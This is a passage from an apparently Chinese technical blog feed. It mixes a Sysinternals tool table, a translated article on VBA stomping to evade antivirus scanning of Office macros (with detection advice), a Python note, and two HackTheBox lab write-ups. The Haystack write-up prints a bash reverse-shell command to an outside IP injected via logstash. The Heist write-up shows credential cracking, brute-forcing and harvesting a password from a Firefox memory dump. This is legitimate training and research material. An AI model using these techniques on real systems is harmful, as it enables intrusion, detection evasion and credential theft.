<tr>
<td>41</td>
<td>procdump(64)</td>
<td><code>Procdump64.exe -ma 6276 firefox-6276.dmp</code> dump进程内存空间</td>
</tr>
<tr>
<td>42</td>
<td>procexp(64)</td>
<td>查看系统进程信息</td>
</tr>
<tr>
<td>43</td>
<td>Procmon</td>
<td>根据设定的过滤条件监控进程的各种行为</td>
</tr>
<tr>
<td>44</td>
<td>PsExec(64)</td>
<td>交互式执行远程系统上的进程 <a href="https://mp.weixin.qq.com/s/HOck5KYFGrVvCxrRCtrnHw">参考</a></td>
</tr>
<tr>
<td>45</td>
<td>psfile(64)</td>
<td></td>
</tr>
<tr>
<td>46</td>
<td>PsGetsid(64)</td>
<td></td>
</tr>
<tr>
<td>47</td>
<td>PsInfo(64)</td>
<td></td>
</tr>
<tr>
<td>48</td>
<td>pskill(64)</td>
<td></td>
</tr>
<tr>
<td>49</td>
<td>pslist(64)</td>
<td></td>
</tr>
<tr>
<td>50</td>
<td>PsLoggedon(64)</td>
<td></td>
</tr>
<tr>
<td>51</td>
<td>psloglist(64)</td>
<td></td>
</tr>
<tr>
<td>52</td>
<td>pspasswd(64)</td>
<td></td>
</tr>
<tr>
<td>53</td>
<td>psping(64)</td>
<td></td>
</tr>
<tr>
<td>54</td>
<td>PsService(64)</td>
<td></td>
</tr>
<tr>
<td>55</td>
<td>psshutdown</td>
<td></td>
</tr>
<tr>
<td>56</td>
<td>pssuspend(64)</td>
<td></td>
</tr>
<tr>
<td>57</td>
<td>RAMMap</td>
<td></td>
</tr>
<tr>
<td>58</td>
<td>RegDelNull(64)</td>
<td></td>
</tr>
<tr>
<td>59</td>
<td>regjump</td>
<td></td>
</tr>
<tr>
<td>60</td>
<td>ru(64)</td>
<td></td>
</tr>
<tr>
<td>61</td>
<td>sdelete(64)</td>
<td></td>
</tr>
<tr>
<td>62</td>
<td>ShareEnum</td>
<td></td>
</tr>
<tr>
<td>63</td>
<td>ShellRunas</td>
<td></td>
</tr>
<tr>
<td>64</td>
<td>sigcheck(64)</td>
<td></td>
</tr>
<tr>
<td>65</td>
<td>streams(64)</td>
<td></td>
</tr>
<tr>
<td>66</td>
<td>strings(64)</td>
<td><code>strings.exe –o -accepteula win7.dd</code>类似于<code>Linux</code>下的<code>strings -a -td win7.dd</code>，以<code>&lt;decimal_offset&gt;:&lt;string&gt;</code>的格式输出二进制文件中的字符串</td>
</tr>
<tr>
<td>67</td>
<td>sync(64)</td>
<td></td>
</tr>
<tr>
<td>68</td>
<td>Sysmon(64)</td>
<td></td>
</tr>
<tr>
<td>69</td>
<td>Tcpvcon</td>
<td></td>
</tr>
<tr>
<td>70</td>
<td>Tcpview</td>
<td></td>
</tr>
<tr>
<td>71</td>
<td>Testlimit(64)</td>
<td></td>
</tr>
<tr>
<td>72</td>
<td>vmmap</td>
<td></td>
</tr>
<tr>
<td>73</td>
<td>Volumeid(64)</td>
<td></td>
</tr>
<tr>
<td>74</td>
<td>whois(64)</td>
<td></td>
</tr>
<tr>
<td>75</td>
<td>Winobj</td>
<td>查看内核对象和命名空间，比如驱动</td>
</tr>
<tr>
<td>76</td>
<td>ZoomIt</td>
<td></td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>经验总结</category>
      </categories>
  </entry>
  <entry>
    <title>VBA Stomping 简介</title>
    <url>/2019/04/30/VBA-Stomping%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p><em>原文标题 VBA Stomping — Advanced Maldoc Techniques (Oct 6, 2018)</em></p>
<p>作者：Kirk Sayre <a href="https://twitter.com/bigmacjpg">@bigmacjpg</a>，Harold Ogden <a href="https://twitter.com/haroldogden">@haroldogden</a> 和 Carrie Roberts <a href="https://twitter.com/OrOneEqualsOne">@OrOneEqualsOne</a></p>
<p>VBA Stomping 是一种可以绕过反病毒检测恶意文档生成技术，它最初由 Vesselin Bontchev 博士引起我们的注意（见<a href="https://github.com/bontchev/pcodedmp">此处</a>）。VBA stomping 是指销毁 Microsoft Office 文档中的 VBA 源代码，只留下文档文件中称为 p-code 的宏代码的编译版本。在这种情况下，仅基于VBA源代码的恶意文档检测会失败。在这篇博文中，我们将详细演示 VBA stomping 并介绍一些其他技术。</p>
<span id="more"></span>
<h2 id="VBA-Stomping"><a href="#VBA-Stomping" class="headerlink" title="VBA Stomping"></a>VBA Stomping</h2><p>首先，我们将在一个简单的非恶意宏上演示 VBA Stomping。此文档在打开时显示带有文本 ABC 的消息框。VBA 源代码和生成的消息框如下所示。</p>
<p><img src="/img/vba-stomping/1_P_mM0Ffo9kzzhtMM1O7oCg.png" alt=""></p>
<p>现在我们修改上面显示的VBA源代码，同时保持中间 p-code 不变。我们将集中讨论当前的 .docx/.xlsx/.docm/.xlsm（Office 2007 以上）格式。但是，此处讨论的技术可以轻松应用于较旧的 .doc/.xls格式。在 Office 2007 以上文件中，VBA 源代码和 p-code 通常位于名为 vbaProject.bin 的文件中。请注意这是默认文件名，可以被重命名。如果要手动修改此文件，我们需要首先解压 .docm/.xlsm 文件，然后在十六进制编辑器中打开 vbaProject.bin 文件。在此示例中，我们将 ABC 改为 XYZ，但仅限于存储 VBA 源代码的位置，而不是 p-code 部分。VBA 源代码以压缩形式存储，即下图中不可打印或奇怪的字符。</p>
<p><img src="/img/vba-stomping/1_KGc1XphbyNT5Dws5W8lOPQ.png" alt=""></p>
<p><img src="/img/vba-stomping/1_iHWUB-LOeGuw_8K02Gixpg.png" alt=""></p>
<p>现在我们已经手动编辑了 VBA 源代码将 ABC 更改为 XYZ，我们打开文档并在单击“启用内容”按钮之前检查 VBA 源代码。</p>
<p><img src="/img/vba-stomping/1_jqYto7TMBR3MUZPqzdhogw.png" alt=""></p>
<p>我们打开文档但未启用宏。在代码编辑器中检查宏，代码显示宏将显示带有文本 XYZ 的消息框，但事实并非如此。实际上，只要启用了内容，就会显示一个 ABC 的消息框，并且代码编辑器中的源代码会更新以匹配！</p>
<p><img src="/img/vba-stomping/1_VE19x2i45U7r6FXDxov1UA.png" alt=""></p>
<p>源代码表示 XYZ 将显示在消息框中，但显示 ABC 。到底是怎么回事？</p>
<p>正如 Bontchev 博士所解释的那样，只要 p-code 与系统上的当前 VBA 版本兼容，文档实际执行的是存储的 p-code。此外，宏编辑器中显示的内容（一旦启用内容）并不是解压的 VBA 源代码，而是反编译的 p-code。</p>
<p>如果我们在不同版本的 Word（使用不同的 VBA 版本）中打开文档，则 p-code 将不可重用。这将强制将 VBA 源代码解压缩并重新编译为 p-code，从而在消息框中显示 XYZ。所以现在我们有一个文档，在一个版本的Office上显示 ABC，但在另一个版本上显示 XYZ。</p>
<p>请注意，这很重要。<strong>使用 VBA Stomping 技术的恶意文档只能使用用于创建文档时相同的 VBA 版本执行。</strong> 我们可以通过在恶意文档生成之前对目标进行侦察来确定要使用的适当 Office 版本适当 Office 版本；或者通过生成具有多个 Office 版本的恶意文档并将其喷射到目标上来解决此限制。</p>
<p>从防守角度看 VBA stomping 是什么效果呢？通常恶意文档检测仅基于 VBA 源代码。甚至许多可用于分析文档的工具都无法识别 VBA 源和 p-code 之间的差异。由 Philippe Lagadec 编写的 <a href="https://github.com/decalage2/oletools/wiki/olevba">olevba 脚本</a>对篡改文档的分析仅显示了解压缩的源代码，且缺少 p-code 细节。</p>
<p><img src="/img/vba-stomping/1_TIq1-TyPn5gxopcr88-U9A.png" alt=""></p>
<p>除非使用 p-code dumper 插件运行，否则 Didier Stevens 的 Python 脚本 <a href="https://blog.didierstevens.com/programs/oledump-py/">oledump.py</a> 也会给出类似的结果。在使用该插件的情况下，输出给出了一些指示，即 p-code 将使消息框显示 ABC，如下图所示。</p>
<p><img src="/img/vba-stomping/1_ZmBHbwFxuqbZB9JZzN4yrw.png" alt=""></p>
<p>Bontchev 博士发布了一个名为 <a href="https://github.com/bontchev/pcodedmp">pcodedmp.py</a> 的 Python 脚本用于显示 p-code，如下图所示。输出可以显示操作名称而不是上面的操作码。</p>
<p><img src="/img/vba-stomping/1_1jU7iSKRyTb93EK5WfIZ3Q.png" alt=""></p>
<p>我们可以通过用零或随机字节覆盖 VBA 源代码来完全擦除（stomp），而不仅仅是修改它。以下截图显示了如何在十六进制编辑器中手动执行此操作。</p>
<p><img src="/img/vba-stomping/1_xCsSmTV9k0qFMjUWfQDWuQ.png" alt=""></p>
<p><img src="/img/vba-stomping/1_XLiGHjipu6lk7JU8rNxzXw.png" alt=""></p>
<p>在这种情况下，VBA 编辑器根本不显示宏代码，但启用内容后仍然显示带有文本 ABC 的消息框。现在，我们在此文件上重新运行 olevba，结果不显示任何VBA源代码，并显示“未找到可疑关键字或 IOC”，而不是之前突出显示我们在使用可疑关键字（AutoOpen）。</p>
<p><img src="/img/vba-stomping/1_3t0jKe01yE0ydhE2pFXvxA.png" alt=""></p>
<h1 id="这个问题有多严重"><a href="#这个问题有多严重" class="headerlink" title="这个问题有多严重?"></a>这个问题有多严重?</h1><p>我们现在将更深入地了解 Office 如何使用压缩的 VBA 源代码和 p-code。稍后当我们讨论如何滥用 Office 功能来轻松修改恶意文档以欺骗许多 AV 扫描时，这将会发挥作用。</p>
<p>Office 文档包含两个用于提取 VBA 的位置，即压缩的 VBA 源代码和 p-code。下表详细说明了在以下情况下使用哪个 VBA 数据源：</p>
<p><img src="/img/vba-stomping/1_Eh5SA794dEMFOlkqR8ThDQ.png" alt=""></p>
<p>从该表中我们可以看到，如果我们有有效的 p-code，则在启用宏时它会忽略压缩的 VBA 源代码，并通过运行 p-code 来执行所有宏功能。作为攻击者，这告诉我们，我们可以完全破坏或修改压缩的 VBA 源代码，并且仍然让我们的恶意文档执行其指定的任务。</p>
<h1 id="现实案例"><a href="#现实案例" class="headerlink" title="现实案例"></a>现实案例</h1><p>上述表明这适用于简单示例，但这真的是威胁吗？让我们通过使用已知的恶意文档将其提升到新的水平。在这种情况下，我们将从最近的 <a href="https://www.cyber.nj.gov/threat-profiles/trojan-variants/emotet">Emotet</a> 恶意文档开始，它目前在 Virus total 上被 36/59 的供应商检测为恶意。</p>
<p><img src="/img/vba-stomping/1_vhePAlQl6xO7TLdXXW1mCg.png" alt=""></p>
<p>如果我们使用这个文档并且如上所述方法简单地处理 VBA 源代码，那么检测率将降至 58 种防病毒解决方案中的 7 种！</p>
<p><img src="/img/vba-stomping/1_15XLHrfFRP4PcFoTSX1GCA.png" alt=""></p>
<p>如您所见，这给网络防御者带来了严重的问题。即使手动分析此类文档也可能存在问题。此时显而易见的问题是<em>可以通过工具自动执行 VBA stomping 还是我们必须手动编辑 Office 文档？</em> 这个问题的答案是肯定的。我们开发了一个 POC 工具来自动在任何 Office 文档中处理压缩的 VBA 源代码（它被用于 VBA stomping 示例的 Emotet 文档，我们不会发布此实用程序）。考虑到自动化 VBA stomping 十分容易，这是一个真正的威胁。</p>
<h1 id="变得更糟"><a href="#变得更糟" class="headerlink" title="变得更糟"></a>变得更糟</h1><p>考虑恶意文档被设计为在执行恶意有效载荷之后立即关闭 MS Word 的情况。与 VBA stomping 结合使用时，没有脱机的 VBA 源代码提取工具将显示 VBA 源代码，并且在启用宏之前，VBA 源代码甚至不会显示在 Office 宏编辑器窗口中。但是启用宏会导致 Word 立即退出而不提供查看反编译源的机会。虽然我们已经证明“类似汇编”的 p-code 是可提取的，但是 p-code 很难解释，并且无法在 VBA 调试器中被分析。此外 p-code 仅在特定的VBA版本上运行。出于这些原因，访问 VBA 源代码对分析人员来说是一个很大的好处。但是如何才能为这样的文件做到这一点呢？</p>
<p>经过一些实验，我们找到了一个简单的解决方案，可以在宏启用后立即停止 MS Word 执行任何方法。请注意，此解决方案适用于 Office 2007 以上的文档，我们研究解决较旧的文档格式。Office 2007 以上的解决方案是从 .docm 文件的 word 目录中删除 vbaData.xml 文件，如下所示（这可以通过 7-Zip 程序完成，而无需手动解压缩和重新压缩文档）。</p>
<p><img src="/img/vba-stomping/1_j953lLi4vkji5nySs3YPeg.png" alt=""></p>
<p>现在我们可以打开文档并启用内容，从而在 VBA 代码编辑器中显示反编译的 p-code，但不执行代码。如果恶意软件作者已采取措施阻止分析人员访问 VBA 源代码，则这种方法可以节省时间。</p>
<p>删除 vbaData.xml 的一个有趣的副作用是它会导致 MS Word 在宏对话框中错误地列出没有宏（参见下图）。</p>
<p><img src="/img/vba-stomping/1_KIhYa2asfDGRAIWXERhXug.png" alt=""></p>
<h1 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h1><p>我们编写了一个开源工具，用于检测名为 VBA Seismograph 的 Office 文档中的 VBA stomping。此工具已在 Ubuntu 16.04 下测试，它检测声明的函数/变量名称、字符串文字以及出现在已编译的 p-code 和 Office 文档的 VBA 源代码中的注释行之间的差异。该工具可在<a href="https://github.com/kirk-sayre-work/VBASeismograph">这里</a>找到。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在这篇博客文章中，我们演示了如何修改或销毁 Office 文档中压缩的 VBA 源代码，来绕过 AV 扫描，并使恶意文档的手动分析更加困难。对此技术的防御涉及检测和标记具有有效 p-code 但无效或缺少 VBA 源代码的文档，或更一般地，检查压缩 VBA 源代码与反编译 p-code 之间的差异。目前，我们还没有发现任何进行此项检查的商用 AV 解决方案，因此这是 AV 扫描解决方案可以改进的领域。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="https://vbastomp.com/">https://vbastomp.com/</a></li>
</ul>
<p><a href="https://medium.com/walmartlabs/vba-stomping-advanced-maldoc-techniques-612c484ab278">原文地址</a></p>
]]></content>
      <categories>
        <category>安全技术</category>
      </categories>
      <tags>
        <tag>外文翻译</tag>
        <tag>VBA</tag>
        <tag>安全技术</tag>
      </tags>
  </entry>
  <entry>
    <title>functools.partial</title>
    <url>/2020/09/21/functools-partial/</url>
    <content><![CDATA[<p><code>functools.partial</code>类似装饰器，可以扩展函数的功能，将某些参数设定为固定值。</p>
<span id="more"></span>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">类func = functools.partial(func, *args, **keywords)</span><br><span class="line"></span><br><span class="line"><span class="comment"># func: 需要被扩展的函数，返回的函数其实是一个类 func 的函数</span></span><br><span class="line"><span class="comment"># *args: 需要被固定的位置参数</span></span><br><span class="line"><span class="comment"># **kwargs: 需要被固定的关键字参数</span></span><br><span class="line"><span class="comment"># 如果在原来的函数 func 中关键字不存在，将会扩展，如果存在，则会覆盖</span></span><br></pre></td></tr></table></figure>
<p>Example from <a href="https://github.com/WSP-LAB/Montage">Montage</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line">pool = Pool(conf.num_proc, init_worker) <span class="comment"># 进程池</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_func</span>(<span class="params">js_path, conf</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">pool_map(pool, exec_func, js_list, conf=conf) <span class="comment"># exec_func依次调用js_list中的每个js，每次conf=conf</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pool_map</span>(<span class="params">pool, func, <span class="built_in">list</span>, **args</span>):</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    func = partial(func, **args) <span class="comment"># 固定关键字参数</span></span><br><span class="line">    <span class="keyword">return</span> pool.<span class="built_in">map</span>(func, <span class="built_in">list</span>) <span class="comment"># 进程池依次调用函数</span></span><br><span class="line">  <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/47124891">彻底明白 Python partial()</a></li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>hackthebox-Haystack</title>
    <url>/2019/11/03/hackthebox-Haystack/</url>
    <content><![CDATA[<p><img src="/img/haystack/1.png" alt=""></p>
<span id="more"></span>
<ul>
<li>使用<code>nmap</code>扫描到端口22、80、9200（ElasticSearch 6.4.2）</li>
</ul>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh     OpenSSH <span class="number">7.4</span> (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   <span class="number">2048</span> <span class="number">2</span>a:<span class="number">8</span>d:e2:<span class="number">92</span>:<span class="number">8</span>b:<span class="number">14</span>:b6:<span class="number">3</span>f:e4:<span class="number">2</span>f:<span class="number">3</span>a:<span class="number">47</span>:<span class="number">43</span>:<span class="number">23</span>:<span class="number">8</span>b:<span class="number">2</span><span class="built_in">b</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> e7:<span class="number">5</span>a:<span class="number">3</span>a:<span class="number">97</span>:<span class="number">8</span>e:<span class="number">8</span>e:<span class="number">72</span>:<span class="number">87</span>:<span class="number">69</span>:a3:<span class="number">0</span>d:d1:<span class="number">00</span>:bc:<span class="number">1</span>f:<span class="number">09</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">01</span>:d2:<span class="number">59</span>:b2:<span class="number">66</span>:<span class="number">0</span>a:<span class="number">97</span>:<span class="number">49</span>:<span class="number">20</span>:<span class="number">5</span>f:<span class="number">1</span>c:<span class="number">84</span>:eb:<span class="number">81</span>:<span class="keyword">ed</span>:<span class="number">95</span> (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http    nginx <span class="number">1.12</span><span class="number">.2</span></span><br><span class="line">|_http-server-<span class="built_in">header</span>: nginx/<span class="number">1.12</span><span class="number">.2</span></span><br><span class="line">|_http-<span class="built_in">title</span>: Site doesn&#x27;t have a <span class="built_in">title</span> (text/html).</span><br><span class="line"><span class="number">9200</span>/tcp <span class="keyword">open</span>  http    nginx <span class="number">1.12</span><span class="number">.2</span></span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: <span class="keyword">DELETE</span></span><br><span class="line">|_http-server-<span class="built_in">header</span>: nginx/<span class="number">1.12</span><span class="number">.2</span></span><br><span class="line">|_http-<span class="built_in">title</span>: Site doesn&#x27;t have a <span class="built_in">title</span> (application/json; charset=UTF<span class="number">-8</span>).</span><br></pre></td></tr></table></figure>
<ul>
<li>访问 <a href="http://10.10.10.115">http://10.10.10.115</a> 得到图片needle.jpg，<code>Stegsolve</code>查看图片可见base64的提示，解码得西班牙语得提示</li>
</ul>
<p><img src="/img/haystack/needle.jpg" alt="needle"></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">la</span> aguja <span class="keyword">en</span> <span class="keyword">el</span> pajar es <span class="string">&quot;clave&quot;</span></span><br><span class="line">the needle in the haystack <span class="keyword">is</span> <span class="string">&quot;key&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用<a href="https://github.com/taskrabbit/elasticsearch-dump"><code>elasticsearch-dump</code></a>获取9200的quotes数据，在数据中搜索可得到两个<code>base64</code>加密的数据（搜索<code>base64</code>得特征字符，比如<code>=</code>），分别为用户名和密码，解码为security和spanish.is.key</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">elasticdump --input=http://10.10.10.115:9200/quotes --output=quotes.json --<span class="built_in">type</span>=data</span><br></pre></td></tr></table></figure>
<ul>
<li>使用<code>ssh</code>登录获得user.txt</li>
</ul>
<p><img src="/img/haystack/2.png" alt=""></p>
<ul>
<li>使用<code>scp</code>上传<a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh"><code>LinEnum</code></a>获取目标机器信息，首先发现<code>logstash</code>以root权限运行，查看/etc/logstash/conf.d/的配置文件，发现其需要root或kibana权限才可以查看</li>
</ul>
<p><img src="/img/haystack/3.png" alt=""></p>
<ul>
<li>利用<a href="https://github.com/mpgn/CVE-2018-17246">CVE-2018-17246</a>获取kibana的shell</li>
</ul>
<p><img src="/img/haystack/4.png" alt=""></p>
<ul>
<li>查看/etc/logstash/conf.d/的配置文件，发现<code>logstash</code>每10s读取/opt/kibana/logstash_*的内容并在过滤后执行，则<code>echo &quot;Ejecutar comando : bash -i &gt;&amp; /dev/tcp/10.10.14.52/22222 0&gt;&amp;1&quot; &gt; /opt/kibana/logstash_ert</code>（可自行搭建<code>kibana</code>，使用其<a href="https://www.jianshu.com/p/443f1ea7b640">grok调试器</a>测试过滤效果），等待一段时间获取返回的shell</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">cat /etc/logstash/conf.d/filter.conf</span><br><span class="line">filter &#123;</span><br><span class="line">	if [type] == &quot;execute&quot; &#123;</span><br><span class="line">		grok &#123;</span><br><span class="line">			match =&gt; &#123; &quot;message&quot; =&gt; &quot;Ejecutar\s*comando\s*:\s+%&#123;GREEDYDATA:comando&#125;&quot; &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cat /etc/logstash/conf.d/input.conf</span><br><span class="line">input &#123;</span><br><span class="line">	file &#123;</span><br><span class="line">		path =&gt; &quot;/opt/kibana/logstash_*&quot;</span><br><span class="line">		start_position =&gt; &quot;beginning&quot;</span><br><span class="line">		sincedb_path =&gt; &quot;/dev/null&quot;</span><br><span class="line">		stat_interval =&gt; &quot;10 second&quot;</span><br><span class="line">		type =&gt; &quot;execute&quot;</span><br><span class="line">		mode =&gt; &quot;read&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cat /etc/logstash/conf.d/output.conf</span><br><span class="line">output &#123;</span><br><span class="line">	if [type] == &quot;execute&quot; &#123;</span><br><span class="line">		stdout &#123; codec =&gt; json &#125;</span><br><span class="line">		exec &#123;</span><br><span class="line">			command =&gt; &quot;%&#123;comando&#125; &amp;&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>获得root.txt</li>
</ul>
<p><img src="/img/haystack/5.png" alt=""></p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>hackthebox</category>
      </categories>
      <tags>
        <tag>hackthebox</tag>
      </tags>
  </entry>
  <entry>
    <title>hackthebox-Heist</title>
    <url>/2019/11/03/hackthebox-Heist/</url>
    <content><![CDATA[<p><img src="/img/heist/1.png" alt=""></p>
<p>不同用户名可能对应相同的密码</p>
<span id="more"></span>
<ul>
<li><code>nmap</code>扫描，<code>-p1-65535</code>，得到端口<code>80</code>、<code>135</code>、<code>445</code>、<code>5985</code>、<code>49668</code></li>
</ul>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line"><span class="number">80</span>/tcp  <span class="keyword">open</span>  <span class="keyword">http</span>          Microsoft IIS httpd <span class="number">10.0</span></span><br><span class="line">| <span class="keyword">http</span>-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="keyword">set</span></span><br><span class="line">| <span class="keyword">http</span>-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/<span class="number">10.0</span></span><br><span class="line">| <span class="keyword">http</span>-title: Support Login Page</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line"><span class="number">135</span>/tcp <span class="keyword">open</span>  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">445</span>/tcp <span class="keyword">open</span>  microsoft-ds?</span><br><span class="line"><span class="number">5985</span>/tcp  <span class="keyword">open</span>  wsman</span><br><span class="line"><span class="number">49668</span>/tcp <span class="keyword">open</span>  <span class="keyword">unknown</span></span><br></pre></td></tr></table></figure>
<ul>
<li>查看<code>http://10.10.10.149</code>，在<code>Login as guest</code>中下载<code>Attachment</code>的<code>config.txt</code></li>
</ul>
<p><img src="/img/heist/2.png" alt=""></p>
<p><img src="/img/heist/3.png" alt=""></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">version 12.2</span><br><span class="line"><span class="literal">no</span><span class="built_in"> service </span>pad</span><br><span class="line">service password-encryption</span><br><span class="line">!</span><br><span class="line">isdn switch-type basic-5ess</span><br><span class="line">!</span><br><span class="line">hostname ios-1</span><br><span class="line">!</span><br><span class="line">security passwords min-length 12</span><br><span class="line"><span class="builtin-name">enable</span><span class="built_in"> secret </span>5 <span class="variable">$1</span><span class="variable">$pdQG</span><span class="variable">$o8nrSzsGXeaduXrjlvKc91</span></span><br><span class="line">!</span><br><span class="line">username rout3r password 7 0242114B0E143F015F5D1E161713</span><br><span class="line">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">ip ssh authentication-retries 5</span><br><span class="line">ip ssh version 2</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">router<span class="built_in"> bgp </span>100</span><br><span class="line"> synchronization</span><br><span class="line"><span class="built_in"> bgp </span>log-neighbor-changes</span><br><span class="line"><span class="built_in"> bgp </span>dampening</span><br><span class="line"><span class="built_in"> network </span>192.168.0.0 mask 300.255.255.0</span><br><span class="line"> timers<span class="built_in"> bgp </span>3 9</span><br><span class="line"> redistribute connected</span><br><span class="line">!</span><br><span class="line">ip classless</span><br><span class="line">ip<span class="built_in"> route </span>0.0.0.0 0.0.0.0 192.168.0.1</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">access-list 101 permit<span class="built_in"> ip </span>any any</span><br><span class="line">dialer-list 1 protocol<span class="built_in"> ip </span>list 101</span><br><span class="line">!</span><br><span class="line"><span class="literal">no</span><span class="built_in"> ip </span>http server</span><br><span class="line"><span class="literal">no</span><span class="built_in"> ip </span>http secure-server</span><br><span class="line">!</span><br><span class="line">line vty 0 4</span><br><span class="line"> session-timeout 600</span><br><span class="line"> authorization exec SSH</span><br><span class="line"> transport input ssh</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>config.txt</code>中提到Cisco的3个密码，2个为<code>type7</code>可直接解密，1个为<code>type5</code>使用<code>hashcat</code>解密；同时搜集到三个用户名<code>rout3r</code>、<code>admin</code>、<code>Hazard</code>，推测<code>Hazard</code>和<code>type5</code>的密码<code>stealth1agent</code>有关</p>
</li>
<li><p>使用<a href="https://github.com/SecureAuthCorp/impacket"><code>impacket</code></a>的<code>lookupsid.py</code>搜索其它用户名，发现<code>support</code>、<code>Chase</code>和<code>Jason</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./lookupsid.py Hazard:stealth1agent@10.10.10.149</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>evil-winrm</code>，用上述发现的用户名和密码组成的字典进行爆破，获得<code>Chase</code>的密码</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ruby evil-winrm.rb -i 10.10.10.149 -u Chase -p <span class="string">&#x27;Q4)sJu\Y8qz*A3?d&#x27;</span></span><br></pre></td></tr></table></figure>
<p>获得<code>user.txt</code></p>
</li>
</ul>
<p><img src="/img/heist/4.png" alt=""></p>
<ul>
<li><p>查看<code>Users</code>目录发现主机用户有<code>Administrator</code>、<code>Chase</code>和<code>Hazard</code></p>
</li>
<li><p>枚举进程，发现<code>firefox</code></p>
</li>
</ul>
<p><img src="/img/heist/5.png" alt=""></p>
<ul>
<li><p>在<code>evil-winrm</code>中<code>upload</code>工具<code>procdump64.exe</code>，将<code>firefox</code>的进程内存dump下来</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./Procdump64.exe -accepteula -ma 6276 firefox-6276.dmp</span><br></pre></td></tr></table></figure>
</li>
<li><p>搜索内存得到新密码</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">select-string firefox-6276.dmp -pattern <span class="string">&quot;password&quot;</span> <span class="comment"># login_username=admin@support.htb&amp;login_password=4dD!5&#125;x/re8]FBuZ&amp;login=</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>evil-winrm</code>以<code>Administrator</code>和新密码登录，获得<code>root.txt</code></p>
</li>
</ul>
<p><img src="/img/heist/6.png" alt=""></p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>hackthebox</category>
      </categories>
      <tags>
        <tag>hackthebox</tag>
      </tags>
  </entry>
  <entry>
    <title>keras预定义激活函数</title>
    <url>/2020/01/04/keras%E9%A2%84%E5%AE%9A%E4%B9%89%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p><a href="https://keras.io/activations/">Available activations</a></p>
<p><a href="https://en.wikipedia.org/wiki/Activation_function">Activation function</a></p>
<p><code>keras</code>常见预定义激活函数公式定义</p>
<span id="more"></span>
<h1 id="softmax"><a href="#softmax" class="headerlink" title="softmax"></a>softmax</h1><p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="5.029ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2222.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389, 0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 